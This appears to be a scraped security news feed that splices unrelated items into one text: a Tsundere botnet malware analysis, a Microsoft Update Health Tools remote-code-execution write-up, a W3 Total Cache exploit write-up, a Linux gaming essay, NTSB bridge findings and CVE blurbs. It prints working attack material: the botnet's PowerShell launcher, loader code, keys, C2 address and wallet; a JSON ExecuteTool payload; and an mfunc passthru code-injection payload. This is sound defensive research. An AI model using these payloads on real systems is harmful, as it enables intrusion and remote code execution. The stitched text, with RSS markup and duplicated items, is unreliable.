We have correlated this threat with previous reports from October 2024 that reveal code similarities, as well as the use of the same C2 retrieval method and wallet. In that instance, the threat actor created malicious Node.js packages and used the Node Package Manager (npm) to deliver the payload. The packages were named similarly to popular packages, employing a technique known as typosquatting. The threat actor targeted libraries such as Puppeteer, Bignum.js, and various cryptocurrency packages, resulting in 287 identified malware packages. This supply chain attack affected Windows, Linux, and macOS users, but it was short-lived, as the packages were removed and the threat actor abandoned this infection method after being detected.The threat actor resurfaced around July 2025 with a new threat. We have dubbed it the Tsundere bot after its C2 panel. This botnet is currently expanding and poses an active threat to Windows users.Currently, there is no conclusive evidence on how the Tsundere bot implants are being spread. However, in one documented case, the implant was installed via a Remote Monitoring and Management (RMM) tool, which downloaded a file named  from a compromised website. In other instances, the sample names suggest that the implants are being disseminated using the lure of popular Windows games, particularly first-person shooters. The samples found in the wild have names such as “valorant”, “cs2”, or “r6x”, which appear to be attempts to capitalize on the popularity of these games among piracy communities.According to the C2 panel, there are two distinct formats for spreading the implant: via an MSI installer and via a PowerShell script. Implants are automatically generated by the C2 panel (as described in the Infrastructure section).The MSI installer was often disguised as a fake installer for popular games and other software to lure new victims. Notably, at the time of our research, it had a very low detection rate.
The installer contains a list of data and JavaScript files that are updated with each new build, as well as the necessary Node.js executables to run these scripts. The following is a list of files included in the sample:nodejs/B4jHWzJnlABB2B7
nodejs/UYE20NBBzyFhqAQ.js
nodejs/79juqlY2mETeQOc
nodejs/thoJahgqObmWWA2
nodejs/node.exe
nodejs/npm.cmd
nodejs/npx.cmd
The last three files in the list are legitimate Node.js files. They are installed alongside the malicious artifacts in the user’s  directory.An examination of the CustomAction table reveals the process by which Windows Installer executes the malware and installs the Tsundere bot:RunModulesSetup 1058    NodeDir powershell -WindowStyle Hidden -NoLogo -enc JABuAG[...]ACkAOwAiAA==
After Base64 decoding, the command appears as follows:$nodePath = "$env:LOCALAPPDATA\nodejs\node.exe";
& $nodePath  - e "const { spawn } = require('child_process'); spawn(process.env.LOCALAPPDATA + '\\nodejs\\node.exe', ['B4jHWzJnlABB2B7'], { detached: true, stdio: 'ignore', windowsHide: true, cwd: __dirname }).unref();"
This will execute Node.js code that spawns a new Node.js process, which runs the loader JavaScript code (in this case, ). The resulting child process runs in the background, remaining hidden from the user.The loader script is responsible for ensuring the correct decryption and execution of the main bot script, which handles npm unpackaging and configuration. Although the loader code, similar to the code for the other JavaScript files, is obfuscated, it can be deobfuscated using open-source tools. Once executed, the loader attempts to locate the unpackaging script and configuration for the Tsundere bot, decrypts them using the AES-256 CBC cryptographic algorithm with a build-specific key and nonce, and saves the decrypted files under different filenames.encScriptPath = 'thoJahgqObmWWA2',
  encConfigPath = '79juqlY2mETeQOc',
  decScript = 'uB39hFJ6YS8L2Fd',
  decConfig = '9s9IxB5AbDj4Pmw',
  keyBase64 = '2l+jfiPEJufKA1bmMTesfxcBmQwFmmamIGM0b4YfkPQ=',
  ivBase64 = 'NxrqwWI+zQB+XL4+I/042A==',
[...]
    const h = path.dirname(encScriptPath),
      i = path.join(h, decScript),
      j = path.join(h, decConfig)
    decryptFile(encScriptPath, i, key, iv)
    decryptFile(encConfigPath, j, key, iv)
The configuration file is a JSON that defines a directory and file structure, as well as file contents, which the malware will recreate. The malware author refers to this file as “config”, but its primary purpose is to package and deploy the Node.js package manager (npm) without requiring manual installation or downloading. The unpackaging script is responsible for recreating this structure, including the  directory with all its libraries, which contains packages necessary for the malware to run.With the environment now set up, the malware proceeds to install three packages to the  directory using npm:: a WebSocket networking library: a library for communicating with Ethereum: a Node.js process management toolLoader script installing the necessary toolset for Tsundere persistence and executionThe  package is installed to ensure the Tsundere bot remains active and used to launch the bot. Additionally,  helps achieve persistence on the system by writing to the registry and configuring itself to restart the process upon login.The PowerShell version of the infector operates in a more compact and simplified manner. Instead of utilizing a configuration file and an unpacker — as done with the MSI installer — it downloads the ZIP file node-v18.17.0-win-x64.zip from the official Node.js website  and extracts it to the  directory, ultimately deploying Node.js on the targeted device. The infector then uses the AES-256-CBC algorithm to decrypt two large hexadecimal-encoded variables, which correspond to the bot script and a persistence script. These decrypted files, along with a  file are written to the disk. The  file contains information about the malicious Node.js package, as well as the necessary libraries to be installed, including the  and  packages. Finally, the infector runs both scripts, starting with the persistence script that is followed by the bot script.The PowerShell infector creates a package file with the implant dependenciesPersistence is achieved through the same mechanism observed in the MSI installer: the script creates a value in the HKCU:\Software\Microsoft\Windows\CurrentVersion\Run registry key that points to itself. It then overwrites itself with a new script that is Base64 decoded. This new script is responsible for ensuring the bot is executed on each login by spawning a new instance of the bot.We will now delve into the Tsundere bot, examining its communication with the command-and-control (C2) server and its primary functionality.Web3 contracts, also known as smart contracts, are deployed on a blockchain via transactions from a wallet. These contracts can store data in variables, which can be modified by functions defined within the contract. In this case, the Tsundere botnet utilizes the Ethereum blockchain, where a method named  is defined to modify the state variable , allowing it to store a string. The string stored in  is used by the Tsundere botnet administrators to store new WebSocket C2 servers, which can be rotated at will and are immutable once written to the Ethereum blockchain.
The Tsundere botnet relies on two constant points of reference on the Ethereum blockchain:Wallet: 0x73625B6cdFECC81A4899D221C732E1f73e504a32Contract: 0xa1b40044EBc2794f207D45143Bd82a1B86156c6bIn order to change the C2 server, the Tsundere botnet makes a transaction to update the state variable with a new address. Below is a transaction made on August 19, 2025, with a value of 0 ETH, which updates the address.Smart contract containing the Tsundere botnet WebSocket C2The state variable has a fixed length of 32 bytes, and a string of 24 bytes (see item [2] in the previous image) is stored within it. When this string is converted from hexadecimal to ASCII, it reveals the new WebSocket C2 server address: ws[:]//185.28.119[.]179:1234.To obtain the C2 address, the bot contacts various public endpoints that provide remote procedure call (RPC) APIs, allowing them to interact with Ethereum blockchain nodes. At the start of the script, the bot calls a function named , which iterates through a list of RPC providers. For each provider, it checks the transactions associated with the contract address and wallet owner, and then retrieves the string from the state variable containing the WebSocket address, as previously observed.Malware code for retrieval of C2 from the smart contractThe Tsundere bot verifies that the C2 address starts with either  or  to ensure it is a valid WebSocket URL, and then sets the obtained string as the server URL. But before using this new URL, the bot first checks the system locale by retrieving the culture name of the machine to avoid infecting systems in the CIS region. If the system is not in the CIS region, the bot establishes a connection to the server via a WebSocket, setting up the necessary handlers for receiving, sending, and managing connection states, such as errors and closed sockets.Bot handlers for communicationThe communication flow between the client (Tsundere bot) and the server (WebSocket C2) is as follows:The Tsundere bot establishes a WebSocket connection with the retrieved C2 address.An AES key is transmitted immediately after the connection is established.The bot sends an empty string to confirm receipt of the key.The server then sends a nonce (IV), enabling the use of encrypted communication from that point on.
Encryption is required for all subsequent communication.The bot transmits the OS information of the infected machine, including the MAC address, total memory, GPU information, and other details. This information is also used to generate a unique identifier (UUID).The C2 server responds with a JSON object, acknowledging the connection and confirming the bot’s presence.With the connection established, the client and server can exchange information freely.
To maintain the connection, keep-alive messages are sent every minute using ping/pong messages.The bot sends encrypted responses as part of the ping/pong messages, ensuring continuous communication.Tsundere communication process with the C2 via WebSocketsThe connections are not authenticated through any additional means, making it possible for a fake client to establish a connection.As previously mentioned, the client sends an encrypted ping message to the C2 server every minute, which returns a pong message. This ping-pong exchange serves as a mechanism for the C2 panel to maintain a list of currently active bots.The Tsundere bot is designed to allow the C2 server to send dynamic JavaScript code. When the C2 server sends a message with  to the bot, the message is evaluated as a new function and then executed. The result of this operation is sent back to the server via a custom function named , which is responsible for transmitting the result as a JSON object, encrypted for secure communication.Tsundere bot evaluation code once functions are received from the C2The ability to evaluate code makes the Tsundere bot relatively simple, but it also provides flexibility and dynamism, allowing the botnet administrators to adapt it to a wide range of actions.However, during our observation period, we did not receive any commands or functions from the C2 server, possibly because the newly connected bot needed to be requested by other threat actors through the botnet panel before it could be utilized.The Tsundere bot utilizes WebSocket as its primary protocol for establishing connections with the C2 server. As mentioned earlier, at the time of writing, the malware was communicating with the WebSocket server located at , and our tests indicated that it was responding positively to bot connections.The following table lists the IP addresses and ports extracted from the provided list of URLs:First seen (contract update)Marketplace and control panelNo business is complete without a marketplace, and similarly, no botnet is complete without a control panel. The Tsundere botnet has both a marketplace and a control panel, which are integrated into the same frontend.Tsundere botnet panel loginThe notable aspect of Tsundere’s control panel, dubbed “Tsundere Netto” (version 2.4.4), is that it has an open registration system. Any user who accesses the login form can register and gain access to the panel, which features various tabs:Bots: a dashboard displaying the number of bots under the user’s controlSettings: user settings and administrative functionsBuild: if the user has an active license, they can create new bots using the two previously mentioned methodologies (MSI or PowerShell)Market: this is the most interesting aspect of the panel, as it allows users to promote their individual bots and offer various services and functionalities to other threat actors. Each build can create a bot that performs a specific set of actions, which can then be offered to othersMonero wallet: a wallet service that enables users to make deposits or withdrawalsSocks proxy: a feature that allows users to utilize their bots as proxies for their trafficTsundere botnet control panel, building system and marketEach build generates a unique build ID, which is embedded in the implant and sent to the C2 server upon infection. This build ID can be linked to the user who created it. According to our research and analysis of other URLs found in the wild, builds are created through the panel and can be downloaded via the URL:hxxps://idk.1f2e[REDACTED]07a4[.]net/api/builds/{BUILD-ID}.msi.
At the time of writing this, the panel typically has between 90 and 115 bots connected to the C2 server at any given time.Based on the text found in the implants, we can conclude with high confidence that the threat actor behind the Tsundere botnet is likely Russian-speaking. The use of the Russian language in the implants is consistent with previous attacks attributed to the same threat actor.Russian being used throughout the codeFurthermore, our analysis suggests a connection between the Tsundere botnet and the 123 Stealer, a C++-based stealer available on the shadow market for $120 per month. This connection is based on the fact that both panels share the same server. Notably, the main domain serves as the frontend for the 123 Stealer panel, while the subdomain “idk.” is used for the Tsundere botnet panel.123 Stealer C2 panel sharing Tsundere’s infrastructure and showcasing its authorBy examining the available evidence, we can link both threats to a Russian-speaking threat actor known as “koneko”. Koneko was previously active on a dark web forum, where they promoted the 123 Stealer, as well as other malware, including a backdoor. Although our analysis of the backdoor revealed that it was not directly related to Tsundere, it shared similarities with the Tsundere botnet in that it was written in Node.js and used PowerShell or MSI as infectors. Before the dark web forum was seized and shut down, koneko’s profile featured the title “node malware senior”, further suggesting their expertise in Node.js-based malware.The Tsundere botnet represents a renewed effort by a presumably identified threat actor to revamp their toolset. The Node.js-based bot is an evolution of an attack discovered in October of last year, and it now features a new strategy and even a new business model. Infections can occur through MSI and PowerShell files, which provides flexibility in terms of disguising installers, using phishing as a point of entry, or integrating with other attack mechanisms, making it an even more formidable threat.
Additionally, the botnet leverages a technique that is gaining popularity: utilizing web3 contracts, also known as “smart contracts”, to host command-and-control (C2) addresses, which enhances the resilience of the botnet infrastructure. The botnet’s possible author, koneko, is also involved in peddling other threats, such as the 123 Stealer, which suggests that the threat is likely to escalate rather than diminish in the coming months. As a result, it is essential to closely monitor this threat and be vigilant for related threats that may emerge in the near future.
%APPDATA%\Local\NodeJSNote: These are wallets that have changed the C2 address in the smart contract since it was created.

While its aim, to help in fast roll‑outs and emergency patches, is good, a flaw in its configuration meant many devices were exposed: attackers could trigger arbitrary code execution remotely.In this post, we’ll walk you through how we found this issue, how Microsoft has responded, and what you can do if your devices are still vulnerable. We’ll cover the original version 1.0, the attack vector we leveraged, evidence from real‑world telemetry, and how newer versions have tried to plug the gap.After reading WatchTowr’s deep dive on abandoned AWS S3 buckets earlier this year, we started wondering: how many Azure blob storage accounts could be silently dangling out there, just waiting to be claimed? So, we began looking, and started monitoring DNS traffic on our own Windows machines. And we found more than we expected.Among the pile of findings, which will be covered in later blogs, one stood out: payloadprod0.blob.core.windows.net . This finding kicked off what would become a deep dive into remote code execution through a signed Microsoft tool.Once we registered the storage account (), we began monitoring for inbound requests. Within hours, we were seeing hundreds of HTTP GET requests hitting the blobs, coming from all over the world. These requests targeted structured URIs like:GET /<hash>/enrolled.json  
GET /<hash>/Devices/<hash>.jsonAll with a consistent user agent: . What could that be?Digging deeper, we queried EDR telemetry and found that , a Microsoft-signed binary known as the Update Health Service, was actively resolving these domains across multiple customer environments. This service lived in: C:\Program Files\Microsoft Update Health Tools\uhssvc.exe. Later, we found out that the Azure storage accounts used, followed a predictable naming pattern: payloadprod0.blob.core.windows.net through payloadprod15.blob.core.windows.net. When we checked, 10 of those 15 blobs were still unregistered. So we claimed them and started watching thousands of similar requests flowing in from all over the world.The obvious next step? Figure out what these endpoints were trying to fetch, and whether we could influence what they received.To understand , we first needed to trace how  actually works. Let’s start with the original version 1.0 of the update health tools. After some reverse engineering, we developed a hypothesis that the team within Microsoft writing this tool, probably needed an easy service to check which updates to install. They apparently decided to use Azure blob storages, with a container per tenant and a few JSON files to specify the configuration.So what does  do, exactly?A new installation will start by checking if it’s Entra joined/registered. If not, it will simply stop as this is an enterprise tool.The service checks whether this Entra tenant is enrolled into update management by downloading a file from /<tenant_hash>/enrolled.json and checking whether  is set to  in this JSON.If the tenant is enrolled it will continue the process of enrolling itself. This means downloading another JSON from /<tenant_hash>/Devices/<device_id_hash>.json with only a single field containing the policy ID assigned to this computer.After that, the Update Health Tools will start polling /<tenant_hash>/Policies/<policy_id>/<cpu>_<osbuild>.json .It will then look at  to determine what to do.Opening up the binary in IDA gives us an easy list of actions we can specify:Our interest was immediately piqued by the “ExecuteTool” option. That sounds like an easy way to get code execution.Scrolling through the <strong>WSD::ToolExecutor::Execute</strong> function we see our first hurdleIt looks like we can only execute a Microsoft signed binary. Diving a bit deeper, we see that we actually need an executable with an embedded signature that’s signed by Microsoft. These are more rare, since most default windows executable are signed using catalog files. With catalog files you can sign a list of executables instead of signing each executable individually. This allows Microsoft to optimise checking of signatures and saves disk space.Luckily there’s an easy target on each windows installation: . But then we hit a new roadblocker.We were excited having found remote code execution in v1.0, and wanted to test it. Unfortunately for us, Microsoft no longer offers version v1.0 from February 2021 for download. Instead, it gives you v1.1 from December 2022. Still determined to get RCE in the latest version, we opened it up in IDA and found a second implementation for getting the config. 😃No longer content with using simple Blob Storage, the developers apparently decided to implement a real web service in v1.1 at devicelistenerprod.microsoft.com. Furthermore, they added new storage accounts specifically designed for EU customers and a 2nd copy of the webservice at  and devicelistenerprod.eudb.microsoft.com. We weren’t able to register any of these storage accounts, nor these domain names.So apparently we won’t have RCE inside the EU, which means all of our European customers at Eye Security are safe! 😉After some more reversing of v1.1, we unlocked the option of re-enabling the old blob storage based communication by setting the configuration parameter  to 1 in the registry. While also allowing us to test from the EU by changing UHS.STORAGEACCOUNTENDPOINTEUDB to a storage account we control.Remote Code Execution (RCE)So, for the old-school experience of popping a calc, we created the following JSON as payload.{
  "RequestId": "00000000-0000-0000-0000-000000000001",
  "EnterpriseActionType": "ExecuteTool",
  "EnterpriseExecutableClientPath": "..\\..\\Windows\\explorer.exe",
  "EnterpriseExecutableClientParameters": "/root,C:\\Windows\\system32\\calc.exe",
  "EnterpriseExecutableClientPayload": []
}Which produced the expected result when testing:Overall impact of this vulnOf course, we didn’t try this on any machine we didn’t own, but we could use the access logs of Azure Blob storage to see how many machines we could have accessed. For this we’ve collected logs for 7 days of traffic to the 10 storage accounts we registered.In that period, we’ve seen  from the Update Health Tools. These are coming from 9.976 unique Azure tenants. Of these, we noticed  asking whether they should enroll. For these requests, we can’t distinguish whether it’s a single machine in this tenant or a whole fleet of machines. The devices looking for their configured policy can be individually identified. These are coming from  and .Given the enormous install base of Windows, this is of course a tiny fraction of machines still running the old (1.0) version of Update Health Tools or having the backward compatible flag enabled for the newer version.We reported this vulnerability to Microsoft on July 7 2025 and they confirmed the behavior on July 17. We successfully transferred ownership of these storage accounts to Microsoft on July 18. Therefore all endpoints should be safe now.After seeing what impact this issue had, it’s of course good to reflect how secure design principles can be used to avoid such issues in the future. The obvious way to avoid such issues is of course to not remove azure storage accounts or domains that publicly released software connects to. You can keep storage accounts reserved and linked to your tenant with all data removed and public access disabled. This makes sure no attacker can register the account, while also providing ease of mind that no data can leak and no unexpected bills will arrive.Looking a bit further into the root cause we see that the developers are confusing transport security with message security. It’s easy to be tricked into believing that since Microsoft owns the storage account and the certificates for the associated, the data received from the server can be trusted. This only means that the data was securely transmitted from public Azure services. What they should have done is sign the messages themselves. That way no matter who owns the storage account or has the ability to generate SSL certificates, they can still verify that the commands to be executed are signed by the correct Microsoft team.]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>China-Nexus APT Group Leverages DLL Sideloading Technique to Attack Government and Media Sectors</title><link>https://cybersecuritynews.com/china-nexus-apt-group-leverages-dll-sideloading-technique/</link><author></author><category>security</category><pubDate>Thu, 20 Nov 2025 05:50:10 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

I am going to put Linux on my gaming PC. Calling it now. 2026 is the year of Linux on the desktop. Or at least on mine.Meanwhile, Microsoft is ending support for Windows 10, including security updates, forcing people to buy new hardware or live with the risks. It’s disabling workarounds that let you set up Windows 11 with a local account or with older hardware. It’s turning Xboxes into PCs and PCs into upsells for its other businesses. Just this week, the company announced that it’s putting AI agents in the taskbar to turn Windows into a “canvas for AI.” I do not think Windows is going to be a better operating system in a year, so it feels like a good time to try Linux again.I’m not normally one to change frogs midstream, but the water sure is getting hot.That’s not to say I know what I’m doing. I’ve used Macs for a decade for work, and I dabbled in Ubuntu 20-something years ago, but otherwise I’ve been a Windows guy since 3.1. At first, that’s because it’s what we had at home, later because that’s where the games were, and finally out of force of habit (and because that’s where the games were). I brought a desktop to college instead of a laptop (so I could play games), and I’ve been building my own PCs for 18 years. I started my journalism career at  magazine, testing gaming PC components.I try to stay familiar with all the major operating systems because of my job, so in addition to my work MacBook I also have a Chromebook, a ThinkPad, and a collection of older hardware I refuse to get rid of. I can work pretty well in Windows, in macOS, or in ChromeOS.My experiences with Linux over the past decade, on the other hand, have largely been as a series of extremely optional Tasks:All of those projects, except the Chromebook one, took longer than expected, and cut into my vanishingly rare discretionary time. That’s also the time I use for gaming, reading, staring into the void, and half-starting organizational projects, so you can see how precious it is to me.The prospect of instead using that time trying to get my computer back to a baseline level of functionality — that is, as useful as it was before I tried installing Linux — is tempting, but it’s also why I haven’t done it yet.It’s a good time to try gaming on Linux. Antonio and Sean have been having fun with Bazzite, a Linux distro that mimics SteamOS; my friend and former colleague Will Smith is cohosting a  podcast called  with this exact premise.So really, why  I blow that up and start over?Based on listening to two and a half episodes of  and a brief text conversation with Will, I’m going to install CachyOS, an Arch-based distro optimized for gaming on modern hardware, with support for cutting-edge CPUs and GPUs and an allegedly easy setup.I don’t expect things to go smoothly. I don’t  know what I’m doing, and Linux is still a very small percentage of the PC gaming world. As of the most recent Steam Hardware & Software Survey — the best proxy we have for PC gaming hardware info as a whole — just over 3 percent of Steam users are running Linux. Of those, 27 percent are using SteamOS (and therefore a Steam Deck), 10 percent are using Arch, 6 percent are using CachyOS, 4 percent are using Bazzite, and the rest are split over a bunch of distros.So if anything goes wrong in my install, it’ll be a lot of forum-hopping and Discord searching to figure it all out. But I’ve cleverly arranged it so the stakes are only medium: I have other machines to work on while my desktop is inevitably borked (and to run programs like Adobe Creative Suite), and if I end up spending hours of my discretionary time learning Linux instead of gaming, well, that’s not the worst outcome.Maybe it’ll all go smoothly and I’ll report back in a few weeks, another prophet of the revolution. Maybe it’ll go terribly and I’ll come crawling back. Only one way to find out.]]></content:encoded></item><item><title>Google&apos;s Gemini 3 is living up to the hype and creating games in one shot</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/googles-gemini-3-is-living-up-to-the-hype-and-creating-games-in-one-shot/</link><author>Mayank Parmar</author><category>security</category><pubDate>Wed, 19 Nov 2025 20:39:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google's Gemini 3 is finally here, and we're impressed with the results, but it still does not adhere to my requests as well as Claude Code.

Investigators found that wire-label banding prevented the wire from being fully inserted into a terminal block spring-clamp gate, causing an inadequate connection. ​Illustration showing how placement of wire-label banding affects the way wires are seated in their terminal blocks. (Source: NTSB) 
After the initial blackout, the Dali’s heading began swinging to starboard toward Pier 17 of the Key Bridge. Investigators found that the pilots and the bridge team attempted to change the vessel’s trajectory, but the loss of propulsion so close to the bridge rendered their actions ineffective. A substantial portion of the bridge subsequently collapsed into the river, and portions of the pier, deck and truss spans collapsed onto the vessel’s bow and forwardmost container bays. 
A seven-person road maintenance crew and one inspector were on the bridge when the vessel struck. Six of the highway workers died. The NTSB found that the quick actions of the Dali pilots, shoreside dispatchers and the Maryland Transportation Authority to stop bridge traffic prevented greater loss of life. 
”Our investigators routinely accomplish the impossible, and this investigation is no different,’ said NTSB Chairwoman Jennifer Homendy. “The Dali, at almost 1,000 feet, is as long as the Eiffel Tower is high, with miles of wiring and thousands of electrical connections. Finding this single wire was like hunting for a loose rivet on the Eiffel Tower. 
“But like all of the accidents we investigate,this was preventable,” Homendy said. “Implementing NTSB recommendations in this investigation will prevent similar tragedies in the future.” 
Contributing to the collapse of the Key Bridge and the loss of life was the lack of countermeasures to reduce the bridge’s vulnerability to collapse due to impact by ocean-going vessels, which have only grown larger since the Key Bridge’s opening in 1977. When the Japan-flagged containership Blue Nagoya contacted the Key Bridge after losing propulsion in 1980, the 390-foot-long vessel caused only minor damage. The Dali, however, is 10 times the size of the Blue Nagoya. ​The comparative sizes of the Blue Nagoya and the Dali relative to the Key Bridge. (Source: NTSB) 
As part of the investigation, the NTSB in March released an initial report on the vulnerability of bridges nationwide to large vessel strikes. The report found that the Maryland Transportation Authority—and many other owners of bridges spanning navigable waterways used by ocean-going vessels—were likely unaware of the potential risk that a vessel collision could pose to their structures. This was despite longstanding guidance from the American Association of State Highway and Transportation Officials recommending that bridge owners perform these assessments. The NTSB sent letters to 30 bridge owners identified in the report, urging them to evaluate their bridges and, if needed, develop plans to reduce risks. All recipients have since responded, and the status of each recommendation is available on the NTSB’s website. 
 As a result of the investigation, the NTSB issued new safety recommendations to the US Coast Guard; US Federal Highway Administration; the American Association of State Highway and Transportation Officials; the Nippon Kaiji Kyokai (ClassNK); the American National Standards Institute; the American National Standards Institute Accredited Standards Committee on Safety in Construction and Demolitions Operations A10; HD Hyundai Heavy Industries; Synergy Marine Pte. Ltd; and WAGO Corporation, the electrical component manufacturer; and multiple bridge owners across the nation. 
A synopsis of actions taken Tuesday, including the probable cause, findings and recommendations, can be found on ntsb.gov​. The complete investigation report will be released in the coming weeks.  ]]></content:encoded></item><item><title>CVE-2025-65103 - OpenSTAManager has an authenticated SQL Injection vulnerability in API via &apos;display&apos; parameter</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65103</link><author></author><category>vulns</category><pubDate>Wed, 19 Nov 2025 20:15:54 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65103

The new documents introduce an irrevocable, perpetual license over anything users upload, broad surveillance-style monitoring of AI features, a clause preventing users from identifying potential patent infringement, years-long retention of usernames even after account deletion, and the integration of all user data (including minors) into Qualcomm’s global data ecosystem. Military weird things and more.

Several sections effectively reshape Arduino from an open community platform into a tightly controlled corporate service with deep data extraction built in. The most striking addition: 

users are now explicitly forbidden from reverse-engineering or even attempting to understand how the platform works unless Arduino gives permission. That’s a profound shift for a brand long embraced by educators, makers, researchers, and open-source advocates.

With the cloud having a rough day and many systems offline, yesterday... Anyone invested in transparency, community governance, or data rights should read these documents closely.

Somewhere an old Uno is whispering “this is not my beautiful life"...

Forbes did a couple press-release style "features" with incorrect information that Qualcomm or Arduino supplied, obviously Qualcomm has severe issues with fraud, acquisitions, et. this was 3 DAYS AGO - Former Qualcomm executive sentenced to prison for $180M fraud scheme. @Bill Curtis & Steve McDowell please consider a revisit...

Nakul Duggal seems to be the one that will end up taking the fall for this, the CEO of Qualcomm is not in the press release for the sale (and the press release seems like it was made by ChatGPT when you put it through those AI detectors?)..

ANY WAY -

Naukul and the Ardunio better get a ride in the over 10 Gulfstreams, which are a puzzle to investors, why so many? And why get a G800 now that's over $75m ...? That's how much Arduino has in funding...

US's Qualcomm adds G800 to corporate jet fleet...

This immediately caught our attention because with 1+ million active installations, it is one of the more wide-spread plugins, which we’ve also encountered numerous times in our customer pentests. Since we didn’t believe that it was so easy to exploit, we decided to take WPScan’s one-liner advisory, analysed the plugin’s cache parsing, and build an exploit for it. Kudos to the original researcher “wcraft” who submitted this bug to WPScan.TL;DR: It is technically a pretty straightforward Remote Code Execution, but The attacker needs to know the  secret.Comments must be enabled for unauthenticated users; otherwise it’s just a Post-Auth vulnerability.Page Cache needs to be enabled in the plugin (disabled by default, but it’s the core functionality)According to WPScan’s advisory, the code execution happens in a function called  which is part of the  class. It indeed uses  to execute some code that comes through its first argument :public function _parse_dynamic_mfunc( $matches ) {
	$code1 = trim( $matches[1] );
	$code2 = trim( $matches[2] );
	$code  = ( $code1 ? $code1 : $code2 );

	if ( $code ) {
		$code = trim( $code, ';' ) . ';';

		try {
			ob_start();
			$result = eval( $code ); // phpcs:ignore Generic.PHP.ForbiddenFunctions.Found
			$output = ob_get_contents();
			ob_end_clean();
		} catch ( \Exception $ex ) {
			$result = false;
		}

			$output = sprintf( 'Unable to execute code: %s', htmlspecialchars( $code ) );
		}
	} else {
		$output = htmlspecialchars( 'Invalid mfunc tag syntax. The correct format is: <!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --><!-- /mfunc W3TC_DYNAMIC_SECURITY --> or <!-- W3TC_DYNAMIC_SECURITY mfunc -->PHP code<!-- /mfunc W3TC_DYNAMIC_SECURITY -->.' );
	}

	return $output;
}But how do we actually reach this function? also defines a function called , which uses  in a . This essentially means that the plugin searches through the cached version of a page for what looks like an  “comment” and hands it over to the previously shown  function:public function _parse_dynamic( $buffer ) {
	// The W3TC_DYNAMIC_SECURITY constant should be a unique string and not an int or boolean.
	if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) || empty( W3TC_DYNAMIC_SECURITY ) || 1 === (int) W3TC_DYNAMIC_SECURITY ) {
		return $buffer;
	}

	$buffer = preg_replace_callback(
		'~<!--\s*mfunc\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/mfunc\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
		array(
			$this,
			'_parse_dynamic_mfunc',
		),
		$buffer
	);

	$buffer = preg_replace_callback(
		'~<!--\s*mclude\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/mclude\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
		array(
			$this,
			'_parse_dynamic_mclude',
		),
		$buffer
	);

	return $buffer;
}This is a straight code injection. However, what stands out here is the check on line 3 for a constant called “W3TC_DYNAMIC_SECURITY”. As you can see in the documentation, you have to explicitly define this constant in the wp-config.php file like this:define('W3TC_DYNAMIC_SECURITY', 'rcesec');And this is the actual roadblock. To successfully exploit this code injection, you need to know the constant’s value. Lazy admins might use the value  from the documentation, but you might also use something else as shown above.However, if the attacker knows the  string, then the code execution is easy to achieve. When the “Page Cache” is enabled in the plugin:Then  is always called through process_cached_page_and_exit whenever a cached page is processed:if ( $this->_caching && ! $this->_late_caching ) {
	$this->_cached_data = $this->_extract_cached_page( false );
	if ( $this->_cached_data ) {
		if ( $this->_late_init ) {
			$w3_late_init = true;
			return;
		} else {
			$this->process_status = 'hit';
			$this->process_cached_page_and_exit( $this->_cached_data );
			// if is passes here - exit is not possible now and will happen on init.
			return;
		}
	} else {
		$this->_late_init = false;
	}
} else {
	$this->_late_init = false;
}So a cached comment like the following which references the configured  constant can ultimately be used to execute arbitrary code since it eventually hits the  function:<!-- mfunc rcesec -->echo passthru($_GET[1337])<!-- /mfunc rcesec -->If comments are enabled for unauthenticated users, then you’ve got an unauthenticated RCE:At RCE Security, we use both 0-day and n-day vulnerabilities in our penetration tests to reflect realistic attacker behaviour.

WBCE CMS is a content management system. Prior to version 1.6.4, a low-privileged user in WBCE CMS can escalate their privileges to the Administrators group by manipulating the groups[] parameter in the /admin/users/save.php request. The UI restricts users to assigning only their existing group, but server-side validation is missing, allowing attackers to overwrite their group membership and obtain full administrative access. This results in a complete compromise of the CMS. This issue has been patched in version 1.6.4.

